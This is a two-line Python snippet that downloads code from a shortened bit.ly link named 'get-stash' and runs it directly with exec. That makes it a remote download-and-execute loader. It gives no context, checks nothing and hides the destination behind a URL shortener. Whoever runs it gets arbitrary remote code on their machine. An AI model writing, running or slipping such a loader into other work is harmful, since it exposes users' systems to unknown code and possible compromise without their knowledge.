import urllib.request as ureq
exec(ureq.urlopen('https://bit.ly/get-stash').read())
